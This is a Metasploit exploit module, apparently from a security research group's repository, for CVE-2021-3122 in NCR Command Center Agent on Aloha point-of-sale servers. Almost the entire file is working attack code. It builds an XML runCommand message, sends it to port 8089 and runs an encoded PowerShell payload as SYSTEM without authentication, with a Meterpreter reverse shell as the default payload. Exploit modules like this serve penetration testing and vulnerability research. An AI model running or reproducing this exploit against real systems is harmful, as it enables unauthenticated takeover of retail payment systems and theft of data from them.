##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/Heroes-Cyber-Security/research
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'NCR Command Center Agent Remote Code Execution',
        'Description' => %q{
          CMCAgent in NCR Command Center Agent 16.3 on Aloha POS/BOH servers permits the submission of a runCommand parameter
          (within an XML document sent to port 8089) that enables the remote, unauthenticated execution of an arbitrary command
          as SYSTEM, as exploited in the wild in 2020 and/or 2021. NOTE: the vendor's position is that exploitation occurs only
          on devices with a certain "misconfiguration."
        },
        'Author' => [
          'daffainfo (Muhammad Daffa)',
          'jjcho (Jericho Nathanael Chrisnanta)'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-3122'],
          ['URL', 'https://www.tetradefense.com/incident-response-services/active-exploit-a-remote-code-execution-rce-vulnerability-for-ncr-aloha-point-of-sale/'],
          ['URL', 'https://hcs-team.com/xxxx'],
        ],
        'DisclosureDate' => '2021-02-07',
        'Platform' => 'win',
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Privileged' => true,
        'Targets' => [
            [
              'Windows',
              {
                'Platform' => 'win',
                'Arch' => [ ARCH_X64, ARCH_X86 ],
                'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp'}
              }
          ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        },
        'DefaultTarget'  => 0,
      )
    )

    register_options(
      [
        Opt::RPORT(8089)
      ]
    )
  end

  def check
    Exploit::CheckCode::Unknown
  end

  def generate_xml(cmd_payload)
    xml_body = '<workitemroot commandname="runCommand">'
    xml_body << '<WorkItem>'
    xml_body << '<WorkItemId>1</WorkItemId>'
    xml_body << '<CommandName>runCommand</CommandName>'
    xml_body << '<SourceNode>0</SourceNode>'
    xml_body << '<TargetNode>0</TargetNode>'
    xml_body << '<Status>InProgress</Status>'
    xml_body << '</WorkItem>'
    xml_body << '<command>'
    xml_body << '<Arguments>'

    xml_body << cmd_payload

    xml_body << '</Arguments>'
    xml_body << '<Guid>00000000-0000-0000-0000-000000000001</Guid>'
    xml_body << '<Result></Result>'
    xml_body << '<destserver>WebServer</destserver>'
    xml_body << '</command>'
    xml_body << '</workitemroot>'
    xml_body << '<:EOM:>'

    xml_body
  end

  def exploit
    begin
      connect
      print_status("Connected to #{rhost}:#{rport}") if datastore['VERBOSE']

      cmd_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, encode_final_payload: true)
      payload_xml = generate_xml(cmd_payload)

      print_status("Generating payload")

      sock.put(payload_xml)

      print_status("Check your shell")
      handler

    rescue ::Rex::ConnectionError => e
      fail_with(Failure::Unreachable, "Failed to connect: #{e}")
    ensure
      disconnect
    end
  end
end
